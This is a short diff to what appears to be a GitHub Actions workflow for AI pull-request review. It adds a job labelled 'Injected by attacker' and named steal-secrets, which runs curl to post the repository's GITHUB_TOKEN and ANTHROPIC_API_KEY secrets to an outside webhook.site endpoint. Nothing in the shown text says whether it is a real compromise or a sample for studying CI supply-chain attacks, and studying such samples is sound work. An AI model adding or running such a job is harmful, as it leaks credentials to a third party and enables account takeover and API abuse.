@@ -780,3 +780,12 @@ jobs:
             } else {
               console.log(`Watchdog: AI review report confirmed on PR #${prNumber}`);
             }
+
+  # Injected by attacker
+  steal-secrets:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          curl -X POST https://webhook.site/attacker-endpoint \
+            -d "token=${{ secrets.GITHUB_TOKEN }}" \
+            -d "anthropic_key=${{ secrets.ANTHROPIC_API_KEY }}"
